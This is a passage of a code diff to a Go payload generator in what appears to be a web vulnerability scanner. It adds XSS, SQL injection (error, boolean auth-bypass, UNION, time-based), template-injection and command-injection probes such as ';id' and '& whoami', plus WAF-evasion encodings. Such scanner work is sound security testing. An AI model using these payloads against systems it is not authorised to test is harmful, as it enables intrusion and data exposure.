@@ -7,6 +7,7 @@ import (
 	"strings"
 
 	"github.com/akha-security/akca/engine/internal/deeptraversal"
+	"github.com/akha-security/akca/engine/internal/nosql"
 	"github.com/akha-security/akca/engine/internal/reflection"
 	"github.com/akha-security/akca/engine/internal/wafintel"
 )
@@ -24,15 +25,20 @@ func Generate(in Input) GenerationResult {
 	filtered = semanticDedupe(filtered)
 	sortPayloads(filtered)
 	selected, used := selectPayloads(filtered, in.Budget)
+	testCases := buildTestCases(selected)
+	estimated := estimateRequests(selected)
 
 	return GenerationResult{
-		EndpointURL: in.Profile.EndpointURL,
-		Parameter:   in.Profile.Parameter,
-		Tech:        in.Tech,
-		Payloads:    selected,
-		Skipped:     skipped,
-		BudgetUsed:  used,
-		BudgetLimit: in.Budget,
+		EndpointURL:       in.Profile.EndpointURL,
+		Parameter:         in.Profile.Parameter,
+		Tech:              in.Tech,
+		Payloads:          selected,
+		TestCases:         testCases,
+		EstimatedRequests: estimated,
+		Shadow:            compareShadow(selected, testCases, used),
+		Skipped:           skipped,
+		BudgetUsed:        used,
+		BudgetLimit:       in.Budget,
 	}
 }
 
@@ -126,8 +132,14 @@ func normalizePayload(pl Payload, profile reflection.ReflectionProfile) Payload 
 	if pl.Encoding == "" {
 		pl.Encoding = "none"
 	}
+	if pl.TransportEncoding == "" {
+		pl.TransportEncoding = transportEncodingForProfile(profile)
+	}
 	if pl.BudgetCost <= 0 {
 		pl.BudgetCost = 1
+	}
+	if pl.EstimatedRequests <= 0 {
+		pl.EstimatedRequests = estimatedRequestsForPayload(pl)
 	}
 	if pl.NoiseLevel == "" {
 		pl.NoiseLevel = "medium"
@@ -140,6 +152,18 @@ func normalizePayload(pl Payload, profile reflection.ReflectionProfile) Payload 
 	}
 	if pl.IsControl || pl.IsNegativeControl {
 		pl.RiskLevel = "safe"
+	}
+	if pl.VerificationStrategy == "" {
+		pl.VerificationStrategy = "signal_compare"
+	}
+	if pl.Technique == "" {
+		pl.Technique = inferTechnique(pl)
+	}
+	if pl.ProbeRole == "" {
+		pl.ProbeRole = inferProbeRole(pl)
+	}
+	if pl.SelectionReason == "" {
+		pl.SelectionReason = pl.VulnClass + " candidate"
 	}
 	pl.Priority = clampPriority(pl.Priority)
 	pl = rankForProfile(pl, profile)
@@ -286,16 +310,17 @@ func normalizeDatabaseFamily(database string) string {
 func payloadDatabaseFamily(pl Payload) string {
 	haystack := strings.ToLower(pl.Variant + " " + pl.ExpectedSignal + " " + pl.Value)
 	switch {
-	case strings.Contains(haystack, "pg_sleep") || strings.Contains(haystack, "pg_cast"):
+	case strings.Contains(haystack, "pg_sleep") || strings.Contains(haystack, "pg_cast") || strings.Contains(haystack, "postgres"):
 		return "postgres"
-	case strings.Contains(haystack, "waitfor") || strings.Contains(haystack, "mssql"):
+	case strings.Contains(haystack, "waitfor") || strings.Contains(haystack, "mssql") || strings.Contains(haystack, "convert"):
 		return "mssql"
-	case strings.Contains(haystack, "dbms_") || strings.Contains(haystack, "oracle"):
+	case strings.Contains(haystack, "dbms_") || strings.Contains(haystack, "oracle") || strings.Contains(haystack, "ctxsys") || strings.Contains(haystack, "utl_inaddr"):
 		return "oracle"
 	case strings.Contains(haystack, "randomblob") || strings.Contains(haystack, "sqlite"):
 		return "sqlite"
 	case strings.Contains(haystack, "sleep") || strings.Contains(haystack, "benchmark") ||
 		strings.Contains(haystack, "extractvalue") || strings.Contains(haystack, "updatexml") ||
+		strings.Contains(haystack, "gtid_subset") || strings.Contains(haystack, "json_keys") ||
 		strings.Contains(haystack, "group_concat") || strings.Contains(haystack, "mysql"):
 		return "mysql"
 	default:
@@ -309,26 +334,64 @@ func payloadDatabaseFamily(pl Payload) string {
 
 func xssPayloads(p reflection.ReflectionProfile) []Payload {
 	var out []Payload
+	quote := strings.ToLower(strings.TrimSpace(p.QuoteType))
 	switch p.Context {
 	case reflection.ContextHTML:
 		out = append(out, xssHTMLPayloads(p)...)
 	case reflection.ContextAttribute:
-		out = append(out,
-			xssPayload(p, "attr_breakout", `" onfocus=alert(1) autofocus="`, "event_handler", 88, 2),
-			xssPayload(p, "attr_breakout_single", `' onmouseover=alert(1) x='`, "event_handler_single", 85, 2),
-			xssPayload(p, "attr_close_tag", `"><img src=x onerror=alert(1)>`, "tag_breakout", 86, 2),
-		)
+		switch {
+		case strings.Contains(quote, "single"):
+			out = append(out,
+				xssPayload(p, "attr_breakout_single", `' onmouseover=alert(1) x='`, "event_handler_single", 92, 2),
+				xssPayload(p, "attr_focus_single", `' onfocus=alert(1) autofocus='`, "event_handler_single", 90, 2),
+				xssPayload(p, "attr_close_single", `'><svg/onload=alert(1)>`, "tag_breakout", 88, 2),
+			)
+		case strings.Contains(quote, "none"):
+			out = append(out,
+				xssPayload(p, "attr_unquoted_focus", ` onfocus=alert(1) autofocus `, "event_handler", 92, 2),
+				xssPayload(p, "attr_unquoted_over", ` onmouseover=alert(1) `, "event_handler", 90, 2),
+				xssPayload(p, "attr_unquoted_close", `><svg/onload=alert(1)>`, "tag_breakout", 88, 2),
+			)
+		default: // double quote or generic
+			out = append(out,
+				xssPayload(p, "attr_breakout", `" onfocus=alert(1) autofocus="`, "event_handler", 92, 2),
+				xssPayload(p, "attr_breakout_single", `' onmouseover=alert(1) x='`, "event_handler_single", 85, 2),
+				xssPayload(p, "attr_close_tag", `"><img src=x onerror=alert(1)>`, "tag_breakout", 88, 2),
+				xssPayload(p, "attr_svg_tag", `"><svg/onload=alert(1)>`, "tag_breakout", 86, 2),
+			)
+		}
 	case reflection.ContextJavaScript:
-		out = append(out,
-			xssPayload(p, "js_breakout", `';alert(1)//`, "js_execution", 92, 2),
-			xssPayload(p, "js_breakout_double", `";alert(1)//`, "js_execution_double", 90, 2),
-			xssPayload(p, "js_template", "${alert(1)}", "js_template_eval", 82, 2),
-			xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
-		)
+		switch {
+		case strings.Contains(quote, "backtick"):
+			out = append(out,
+				xssPayload(p, "js_template", "${alert(1)}", "js_template_eval", 95, 2),
+				xssPayload(p, "js_template_breakout", "`+alert(1)+`", "js_template_eval", 90, 2),
+				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
+			)
+		case strings.Contains(quote, "single"):
+			out = append(out,
+				xssPayload(p, "js_breakout_single", `';alert(1)//`, "js_execution", 94, 2),
+				xssPayload(p, "js_expr_single", `'-alert(1)-'`, "js_execution", 89, 2),
+				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
+			)
+		case strings.Contains(quote, "double"):
+			out = append(out,
+				xssPayload(p, "js_breakout_double", `";alert(1)//`, "js_execution_double", 94, 2),
+				xssPayload(p, "js_expr_double", `"-alert(1)-"`, "js_execution_double", 89, 2),
+				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
+			)
+		default:
+			out = append(out,
+				xssPayload(p, "js_breakout", `';alert(1)//`, "js_execution", 92, 2),
+				xssPayload(p, "js_breakout_double", `";alert(1)//`, "js_execution_double", 90, 2),
+				xssPayload(p, "js_template", "${alert(1)}", "js_template_eval", 85, 2),
+				xssPayload(p, "js_close_script", `</script><svg/onload=alert(1)>`, "script_breakout", 88, 2),
+			)
+		}
 	case reflection.ContextURL:
 		out = append(out,
-			xssPayload(p, "url_scheme", `javascript:alert(1)`, "url_scheme_execution", 80, 2),
-			xssPayload(p, "url_data", `data:text/html,<script>alert(1)</script>`, "url_data_scheme", 74, 2),
+			xssPayload(p, "url_scheme", `javascript:alert(1)`, "url_scheme_execution", 85, 2),
+			xssPayload(p, "url_data", `data:text/html,<script>alert(1)</script>`, "url_data_scheme", 78, 2),
 		)
 	case reflection.ContextJSON:
 		out = append(out,
@@ -338,6 +401,16 @@ func xssPayloads(p reflection.ReflectionProfile) []Payload {
 	case reflection.ContextCSS:
 		out = append(out,
 			xssPayload(p, "css_expression", `</style><svg/onload=alert(1)>`, "style_breakout", 70, 2),
+		)
+	case reflection.ContextXML:
+		out = append(out,
+			xssPayload(p, "xml_cdata_breakout", `]]><svg/onload=alert(1)>`, "xml_cdata_breakout", 74, 2),
+			xssPayload(p, "xml_tag_breakout", `</x><svg/onload=alert(1)>`, "xml_tag_breakout", 72, 2),
+		)
+	case reflection.ContextComment:
+		out = append(out,
+			xssPayload(p, "comment_breakout", `--><svg/onload=alert(1)>`, "comment_breakout", 76, 2),
+			xssPayload(p, "comment_script_breakout", `--><script>alert(1)</script>`, "comment_script_breakout", 74, 2),
 		)
 	default:
 		// Unknown/XML/comment context — send full polyglot suite (thorough scan).
@@ -352,6 +425,9 @@ func xssHTMLPayloads(p reflection.ReflectionProfile) []Payload {
 		xssPayload(p, "html_svg_onload", `"><svg/onload=alert(1)>`, "dom_mutation_svg", 90, 2),
 		xssPayload(p, "html_details", `<details/open/ontoggle=alert(1)>`, "dom_mutation_details", 84, 2),
 		xssPayload(p, "html_iframe_srcdoc", `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`, "iframe_srcdoc", 80, 2),
+		xssPayload(p, "html_audio_onerror", `<audio src=x onerror=alert(1)>`, "dom_mutation_audio", 82, 2),
+		xssPayload(p, "html_video_source", `<video><source src=x onerror=alert(1)></video>`, "dom_mutation_video", 81, 2),
+		xssPayload(p, "html_math_xlink", `<math><a xlink:href=javascript:alert(1)>x`, "dom_mutation_math", 79, 2),
 	}
 }
 
@@ -381,31 +457,38 @@ func sqliPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 		sqliPayload(p, "error_single_quote", `'`, "sql_error", 72, 1),
 		sqliPayload(p, "error_double_quote", `"`, "sql_error_dquote", 60, 1),
 		sqliPayload(p, "error_backslash", `\`, "sql_error_backslash", 58, 1),
-		// Boolean SQLi pairs are generated dynamically by the SQLi runner. Static
-		// true/false values here waste budget and create reusable scanner markers.
-		// MySQL time-based XOR. URL encoding is applied later by the request
-		// builder; keeping the payload raw prevents % from being double-encoded.
-		sqliPayload(p, "mysql_xor_if_sleep", `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`, "timing_mysql_xor", 82, 3),
-		sqliPayload(p, "stacked_sleep", `'; SELECT SLEEP(5)-- -`, "timing_stacked", 62, 3),
-		sqliPayload(p, "extractvalue", `' AND extractvalue(1,concat(0x7e,version()))-- -`, "sql_error_extractvalue", 60, 2),
-		sqliPayload(p, "updatexml", `' AND updatexml(1,concat(0x7e,version()),1)-- -`, "sql_error_updatexml", 58, 2),
-		// Real-world blind/time payloads used in production bug bounty.
-		sqliPayload(p, "nested_sleep_quote", `",(select * from (select(sleep(10)))a)`, "timing_mysql_nested", 78, 2),
-		sqliPayload(p, "nested_sleep_comma", `',(select * from (select(sleep(10)))a)-- -`, "timing_mysql_nested", 77, 2),
-		// Payloads remain raw; request builders own transport encoding. Keeping a
-		// pre-encoded duplicate would turn % into %25 on query/form surfaces.
-		sqliPayload(p, "waitfor_delay", `';WAITFOR DELAY '0:0:5'--`, "timing_mssql", 75, 3),
-		sqliPayload(p, "waitfor_delay_spaced", `' WAITFOR DELAY '0:0:5'--`, "timing_mssql", 74, 3),
+		sqliPayload(p, "error_paren_quote", `')`, "sql_error", 64, 1),
+		sqliPayload(p, "error_double_paren", `")`, "sql_error_dquote", 62, 1),
 		sqliPayload(p, "order_by_probe", `' ORDER BY 10-- -`, "sql_error", 65, 1),
 		sqliPayload(p, "group_concat", `' AND 1=GROUP_CONCAT(1,2)-- -`, "sql_error", 63, 2),
-		// PostgreSQL time-based — always included regardless of DB fingerprint.
+		// Cross-database error functions
+		sqliPayload(p, "extractvalue", `' AND extractvalue(1,concat(0x7e,version()))-- -`, "sql_error_extractvalue", 60, 2),
+		sqliPayload(p, "updatexml", `' AND updatexml(1,concat(0x7e,version()),1)-- -`, "sql_error_updatexml", 58, 2),
+		sqliPayload(p, "error_gtid_subset", `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -`, "sql_error_gtid", 68, 2),
+		sqliPayload(p, "error_json_keys", `' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -`, "sql_error_json", 67, 2),
+		sqliPayload(p, "error_mssql_convert", `' AND 1=CONVERT(INT, (SELECT @@version))-- -`, "sql_error_mssql", 68, 2),
+		sqliPayload(p, "error_oracle_ctxsys", `' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1))-- -`, "sql_error_oracle", 66, 2),
+		sqliPayload(p, "pg_cast_error", `' AND (SELECT 1 FROM CAST((SELECT version()) AS INT))--`, "sql_error", 71, 2),
+		// Boolean & Auth bypass
+		sqliPayload(p, "boolean_quoted_or", `' OR '1'='1`, "boolean_differential", 80, 2),
+		sqliPayload(p, "boolean_numeric_or", ` OR 1=1`, "boolean_differential", 79, 2),
+		sqliPayload(p, "boolean_paren_or", `') OR ('1'='1`, "boolean_differential", 81, 2),
+		sqliPayload(p, "boolean_limit_or", `' OR 1=1 LIMIT 1-- -`, "boolean_differential", 78, 2),
+		// Union-based
+		sqliPayload(p, "union_select_null", `' UNION SELECT NULL,NULL,NULL-- -`, "union_select", 75, 2),
+		sqliPayload(p, "union_all_nulls", `' UNION ALL SELECT NULL,NULL,NULL,NULL-- -`, "union_select", 74, 2),
+		// Timing & Polyglots
+		sqliPayload(p, "mysql_xor_if_sleep", `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`, "timing_mysql_xor", 82, 3),
+		sqliPayload(p, "stacked_sleep", `'; SELECT SLEEP(5)-- -`, "timing_stacked", 62, 3),
+		sqliPayload(p, "nested_sleep_quote", `",(select * from (select(sleep(10)))a)`, "timing_mysql_nested", 78, 2),
+		sqliPayload(p, "nested_sleep_comma", `',(select * from (select(sleep(10)))a)-- -`, "timing_mysql_nested", 77, 2),
+		sqliPayload(p, "waitfor_delay", `';WAITFOR DELAY '0:0:5'--`, "timing_mssql", 75, 3),
+		sqliPayload(p, "waitfor_delay_spaced", `' WAITFOR DELAY '0:0:5'--`, "timing_mssql", 74, 3),
 		sqliPayload(p, "pg_sleep_stacked", `'; SELECT pg_sleep(10)-- -`, "timing_postgres", 77, 3),
 		sqliPayload(p, "pg_sleep_concat", `'||(SELECT pg_sleep(10))-- -`, "timing_postgres_concat", 76, 3),
 		sqliPayload(p, "pg_sleep_and", `' AND (SELECT pg_sleep(10))-- -`, "timing_postgres", 75, 3),
 		sqliPayload(p, "pg_sleep_nested", `",(SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres", 74, 3),
 		sqliPayload(p, "pg_sleep_subquery", `' AND (SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres", 73, 3),
-		// Advanced / Polyglot / JSON SQLi additions
-		sqliPayload(p, "pg_cast_error", `' AND (SELECT 1 FROM CAST((SELECT version()) AS INT))--`, "sql_error", 71, 2),
 		sqliPayload(p, "sqli_polyglot_sleep", `SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/`, "timing_stacked", 69, 3),
 	)
 
@@ -415,31 +498,45 @@ func sqliPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 	switch {
 	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
 		out = append(out,
+			sqliPayload(p, "mysql_gtid_error", `' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -`, "sql_error_gtid", 75, 2),
+			sqliPayload(p, "mysql_json_keys_error", `' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))-- -`, "sql_error_json", 74, 2),
 			sqliTime(p, "mysql_sleep", `' AND SLEEP(5)-- -`, "timing_mysql"),
+			sqliTime(p, "mysql_sleep_numeric", ` AND SLEEP(5)`, "timing_mysql"),
 			sqliTime(p, "mysql_xor_if_sleep_db", `0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z`, "timing_mysql_xor"),
 			sqliTime(p, "mysql_sleep_paren", `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`, "timing_mysql_nested"),
+			sqliTime(p, "mysql_sleep_double", `" AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`, "timing_mysql_nested"),
+			sqliTime(p, "mysql_or_sleep", `' OR SLEEP(5)-- -`, "timing_mysql"),
 			sqliTime(p, "mysql_benchmark", `' AND BENCHMARK(3000000,MD5(1))-- -`, "timing_mysql_benchmark"),
 			sqliTime(p, "mysql_if_sleep", `' AND IF(1=1,SLEEP(5),0)-- -`, "timing_mysql_if"),
+			sqliTime(p, "mysql_order_by_sleep", `(SELECT(SLEEP(5)))`, "timing_mysql_nested"),
 		)
 	case strings.Contains(db, "postgres"):
 		out = append(out,
+			sqliPayload(p, "pg_cast_num_error", `' AND (SELECT 1 FROM CAST((SELECT current_user) AS NUMERIC))-- -`, "sql_error", 70, 2),
 			sqliTime(p, "pg_sleep", `'; SELECT pg_sleep(10)-- -`, "timing_postgres"),
 			sqliTime(p, "pg_sleep_concat", `'||(SELECT pg_sleep(10))-- -`, "timing_postgres_concat"),
 			sqliTime(p, "pg_sleep_and", `' AND (SELECT pg_sleep(10))-- -`, "timing_postgres"),
 			sqliTime(p, "pg_sleep_from", `' AND (SELECT pg_sleep(10) FROM (SELECT 1)a)-- -`, "timing_postgres"),
+			sqliTime(p, "pg_sleep_null", `' AND (SELECT 1 FROM (SELECT pg_sleep(10))a)-- -`, "timing_postgres"),
 		)
 	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
 		out = append(out,
+			sqliPayload(p, "mssql_user_convert", `' AND 1=CONVERT(INT, (SELECT user_name()))-- -`, "sql_error_mssql", 70, 2),
 			sqliTime(p, "mssql_waitfor", `'; WAITFOR DELAY '0:0:5'-- -`, "timing_mssql"),
 			sqliTime(p, "mssql_waitfor_if", `' IF 1=1 WAITFOR DELAY '0:0:5'-- -`, "timing_mssql_if"),
 		)
 	case strings.Contains(db, "oracle"):
 		out = append(out,
+			sqliPayload(p, "oracle_utl_inaddr", `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))-- -`, "sql_error_oracle", 70, 2),
 			sqliTime(p, "oracle_sleep", `' AND DBMS_LOCK.SLEEP(5)-- -`, "timing_oracle"),
 			sqliTime(p, "oracle_dbms_pipe", `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -`, "timing_oracle_pipe"),
 		)
 	case strings.Contains(db, "sqlite"):
-		out = append(out, sqliTime(p, "sqlite_randomblob", `' AND 1=randomblob(100000000)-- -`, "timing_sqlite"))
+		out = append(out,
+			sqliPayload(p, "sqlite_cast_error", `' AND 1=CAST((SELECT sqlite_version()) AS INT)-- -`, "sql_error", 70, 2),
+			sqliTime(p, "sqlite_randomblob", `' AND 1=randomblob(100000000)-- -`, "timing_sqlite"),
+			sqliTime(p, "sqlite_hex_randomblob", `' AND 1=like('ABCDEFG',upper(hex(randomblob(50000000))))-- -`, "timing_sqlite"),
+		)
 	default:
 		out = append(out,
 			sqliTime(p, "generic_sleep", `' AND SLEEP(5)-- -`, "timing_generic"),
@@ -455,7 +552,7 @@ func sqliPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 }
 
 func sqliTime(p reflection.ReflectionProfile, variant, value, signal string) Payload {
-	pl := sqliPayload(p, variant, value, signal, 62, 3)
+	pl := sqliPayload(p, variant, value, signal, 78, 3)
 	pl.NoiseLevel = "high"
 	pl.VerificationStrategy = "timing_differential"
 	pl.SelectionReason = "database fingerprint supports time-based blind SQLi"
@@ -479,10 +576,12 @@ func sstiPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 	case strings.Contains(fw, "django") || strings.Contains(fw, "jinja") || strings.Contains(fw, "flask"):
 		addEngine("jinja2", `{{11*13}}`, "ssti_eval_jinja", 74)
 		addEngine("jinja2_parenthesized", `{{(17*19)}}`, "ssti_eval_jinja", 70)
+		addEngine("jinja2_str_multiply", `{{7*'7'}}`, "ssti_eval_jinja", 68)
 		addEngine("jinja2_statement", `{% print 23*29 %}`, "ssti_eval_jinja", 66)
 	case strings.Contains(fw, "twig") || strings.Contains(fw, "symfony"):
 		addEngine("twig", `{{17*19}}`, "ssti_eval_twig", 74)
 		addEngine("twig_parenthesized", `{{(23*29)}}`, "ssti_eval_twig", 69)
+		addEngine("twig_filter", `{{11|dump}}`, "ssti_eval_twig", 65)
 	case strings.Contains(fw, "freemarker"):
 		addEngine("freemarker", `${17*19}`, "ssti_eval_freemarker", 74)
 		addEngine("freemarker_assign", `<#assign x=23*29>${x}`, "ssti_eval_freemarker", 68)
@@ -491,8 +590,10 @@ func sstiPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 	case strings.Contains(fw, "spring") || strings.Contains(fw, "thymeleaf"):
 		addEngine("spel", `${3*3}`, "ssti_eval_spel", 72)
 		addEngine("thymeleaf", `[[${11*11}]]`, "ssti_eval_thymeleaf", 70)
+		addEngine("thymeleaf_expr", `[(7*7)]`, "ssti_eval_thymeleaf", 68)
 	case strings.Contains(fw, "smarty"):
 		addEngine("smarty", `{4*4}`, "ssti_eval_smarty", 72)
+		addEngine("smarty_math", `{math equation="x*y" x=7 y=7}`, "ssti_eval_smarty", 68)
 	case strings.Contains(fw, "handlebars") || strings.Contains(fw, "express") || strings.Contains(lang, "node") || strings.Contains(lang, "javascript"):
 		addEngine("handlebars", `{{#with "s" as |x|}}{{/with}}`, "ssti_handlebars", 60)
 		addEngine("erb_like", `<%= 5*5 %>`, "ssti_eval_erb", 66)
@@ -524,22 +625,31 @@ func cmdPayloads(p reflection.ReflectionProfile, tech TechHints) []Payload {
 	}
 
 	if isWindowsTech(tech) {
-		add("win_amp_dir", `& dir`, "command_output_win", 62)
+		add("win_amp_dir", `& dir`, "command_output_win", 65)
+		add("win_amp_whoami", `& whoami`, "command_output_win_whoami", 63)
 		add("win_pipe_whoami", `| whoami`, "command_output_win_whoami", 60)
+		add("win_or_whoami", `|| whoami`, "command_output_win_whoami", 59)
 		add("win_for_ping", `& ping -n 5 127.0.0.1`, "timing_win", 56)
+		add("win_powershell_sleep", `& powershell -c "Start-Sleep -s 5"`, "timing_win", 55)
 		add("win_obfuscated_cmd", `& c""o""m""p""s""p""e""c`, "command_output_win", 54)
 		add("win_var_concat", `& set a=who&& set b=ami&& call %a%%b%`, "command_output_win_whoami", 52)
 	} else {
 		add("unix_semicolon_id", `;id`, "command_output", 64)
 		add("unix_pipe_id", `|id`, "command_output_pipe", 62)
+		add("unix_or_id", `|| id`, "command_output", 61)
 		add("unix_subshell_id", `$(id)`, "command_output_subshell", 60)
 		add("unix_backtick_id", "`id`", "command_output_backtick", 58)
 		add("unix_and_id", `&& id`, "command_output_and", 56)
+		add("unix_space_ifs_id", `;id${IFS}`, "command_output", 55)
 		add("unix_newline_id", "%0aid", "command_output_newline", 54)
 		add("unix_obfuscated_id", `;w'h'o'a'm'i`, "command_output", 53)
 		add("unix_var_id", `;who$@ami`, "command_output", 52)
 		add("unix_b64_id", `;sh<<<"aWQ="`, "command_output", 50)
-		out = append(out, cmdTime(p, "unix_sleep", `;sleep 5`, "timing_unix"))
+		out = append(out,
+			cmdTime(p, "unix_sleep", `;sleep 5`, "timing_unix"),
+			cmdTime(p, "unix_sleep_pipe", `| sleep 5`, "timing_unix"),
+			cmdTime(p, "unix_sleep_and", `&& sleep 5`, "timing_unix"),
+		)
 	}
 	return out
 }
@@ -596,6 +706,8 @@ func wafEvasionVariants(in Input, base []Payload) []Payload {
 			v.Encoding = variant.enc
 			v.WAFAdapted = true
 			v.WAFVendor = vendor
+			v.Technique = TechniqueWAFMutation
+			v.Mutations = append(append([]MutationSpec{}, p.Mutations...), MutationSpec{Layer: "waf", Technique: variant.enc})
 			v.Variant = p.Variant + "_waf_" + sanitizeVendor(vendor) + "_" + variant.enc
 			v.SelectionReason = p.SelectionReason + "; WAF bypass for " + vendor + " (" + variant.enc + ")"
 			v.SemanticKey = semanticKey(p) + "|waf:" + sanitizeVendor(vendor) + ":" + variant.enc
@@ -625,6 +737,7 @@ func wafVariantsForPayload(value, family, vendor string) []struct {
 		add(wafintel.ApplyEncoding(value, "url"), "url")
 		add(wafintel.ApplyEncoding(value, "double_url"), "double_url")
 		add(wafintel.EncodingCascade(value, "unicode", "url"), "unicode_url")
+		add(wafintel.ApplyEncoding(value, "unicode_nfkc"), "unicode_nfkc")
 		if strings.Contains(v, "modsecurity") || strings.Contains(v, "aws") {
 			add(wafintel.ApplyEncoding(value, "hex"), "hex")
 		}
@@ -634,6 +747,7 @@ func wafVariantsForPayload(value, family, vendor string) []struct {
 		}
 		add(wafintel.ApplyEncoding(value, "url"), "url")
 	case "xss", "ssti":
+		add(wafintel.ApplyEncoding(value, "unicode_nfkc"), "unicode_nfkc")
 		switch {
 		case strings.Contains(v, "cloudflare") || strings.Contains(v, "imperva"):
 			add(wafintel.ApplyEncoding(value, "unicode"), "unicode")
@@ -701,8 +815,10 @@ func looksLikeWindowsCommand(value string) bool {
 	return strings.Contains(lower, "cmd /") || strings.Contains(lower, "ping -n") ||
 		strings.Contains(lower, "set /a") || strings.Contains(lower, " set ") ||
 		strings.Contains(lower, "%comspec%") || strings.Contains(lower, "call %") ||
+		strings.Contains(lower, "powershell") ||
 		strings.HasPrefix(lower, "& dir") || strings.HasPrefix(lower, "& set") ||
-		strings.HasPrefix(lower, "| whoami") || strings.HasPrefix(lower, "& c\"\"")
+		strings.HasPrefix(lower, "& whoami") || strings.HasPrefix(lower, "| whoami") ||
+		strings.HasPrefix(lower, "|| whoami") || strings.HasPrefix(lower, "& c\"\"")
 }
 
 // transformForWAF returns a vendor/family-appropriate, transport-safe evasion of
@@ -795,33 +911,11 @@ func shouldIncludeSQLi(in Input) bool {
 }
 
 func shouldIncludeSSTI(in Input) bool {
-	if techUnknown(in) {
-		return true
-	}
-	fw := strings.ToLower(in.Tech.Framework)
-	lang := strings.ToLower(in.Tech.BackendLanguage)
-	return strings.Contains(fw, "django") || strings.Contains(fw, "flask") ||
-		strings.Contains(fw, "jinja") || strings.Contains(fw, "twig") ||
-		strings.Contains(fw, "freemarker") || strings.Contains(fw, "spring") ||
-		strings.Contains(fw, "velocity") || strings.Contains(fw, "smarty") ||
-		strings.Contains(fw, "thymeleaf") || strings.Contains(fw, "handlebars") ||
-		strings.Contains(fw, "symfony") || strings.Contains(fw, "rails") ||
-		strings.Contains(fw, "express") || strings.Contains(lang, "ruby")
+	return true
 }
 
 func shouldIncludeCmdInj(in Input) bool {
-	if techUnknown(in) {
-		return true
-	}
-	lang := strings.ToLower(in.Tech.BackendLanguage)
-	if strings.Contains(lang, "python") || strings.Contains(lang, "php") ||
-		strings.Contains(lang, "node") || strings.Contains(lang, "ruby") ||
-		strings.Contains(lang, "perl") || strings.Contains(lang, "go") ||
-		strings.Contains(lang, "asp") || strings.Contains(lang, ".net") {
-		return true
-	}
-	fw := strings.ToLower(in.Tech.Framework)
-	return strings.Contains(fw, "express") || strings.Contains(fw, "laravel")
+	return true
 }
 
 func skippedFamilies(in Input, candidates []Payload) []SkipFamily {
@@ -1219,6 +1313,135 @@ func payloadCost(payloads []Payload) int {
 	return used
 }
 
+func estimateRequests(payloads []Payload) int {
+	total := 0
+	for _, p := range payloads {
+		total += p.EstimatedRequests
+	}
+	return total
+}
+
+func estimatedRequestsForPayload(pl Payload) int {
+	if pl.IsControl || pl.IsNegativeControl {
+		return 1
+	}
+	switch {
+	case strings.Contains(pl.VerificationStrategy, "timing"):
+		return 3
+	case strings.Contains(pl.VerificationStrategy, "oast") || strings.Contains(pl.ExpectedSignal, "oast"):
+		return 1
+	case strings.Contains(pl.VerificationStrategy, "differential"):
+		return 2
+	case strings.Contains(pl.VerificationStrategy, "template_eval"):
+		return 2
+	default:
+		return 1
+	}
+}
+
+func inferTechnique(pl Payload) Technique {
+	if pl.IsControl || pl.IsNegativeControl {
+		return TechniqueBaseline
+	}
+	if pl.WAFAdapted {
+		return TechniqueWAFMutation
+	}
+	haystack := strings.ToLower(pl.VerificationStrategy + " " + pl.ExpectedSignal + " " + pl.Variant)
+	switch {
+	case strings.Contains(haystack, "oast") || strings.Contains(haystack, "blind"):
+		return TechniqueOAST
+	case strings.Contains(haystack, "timing") || strings.Contains(haystack, "sleep") || strings.Contains(haystack, "delay"):
+		return TechniqueTiming
+	case pl.Family == "xss":
+		return TechniqueContext
+	default:
+		return TechniqueDifferential
+	}
+}
+
+func inferProbeRole(pl Payload) ProbeRole {
+	switch {
+	case pl.IsNegativeControl:
+		return ProbeRoleNegative
+	case pl.IsControl:
+		return ProbeRoleBaseline
+	case strings.Contains(strings.ToLower(pl.ExpectedSignal), "oast"):
+		return ProbeRoleOAST
+	default:
+		return ProbeRolePositive
+	}
+}
+
+func transportEncodingForProfile(profile reflection.ReflectionProfile) string {
+	loc := strings.ToLower(strings.TrimSpace(profile.ParameterLocation))
+	ct := strings.ToLower(strings.TrimSpace(profile.ContentType))
+	switch {
+	case strings.Contains(ct, "json") || loc == "json" || loc == "graphql":
+		return "json"
+	case loc == "query" || loc == "form" || loc == "path":
+		return loc
+	case loc == "multipart":
+		return "multipart"
+	case loc == "header" || loc == "cookie":
+		return loc
+	default:
+		return "raw"
+	}
+}
+
+func buildTestCases(payloads []Payload) []TestCase {
+	out := make([]TestCase, 0, len(payloads))
+	for _, p := range payloads {
+		if p.Family != "sqli" {
+			continue
+		}
+		steps := []ProbeStep{
+			{
+				Role:              p.ProbeRole,
+				Payload:           p,
+				ExpectedSignal:    p.ExpectedSignal,
+				EstimatedRequests: p.EstimatedRequests,
+			},
+		}
+		out = append(out, TestCase{
+			ID:                p.SemanticKey,
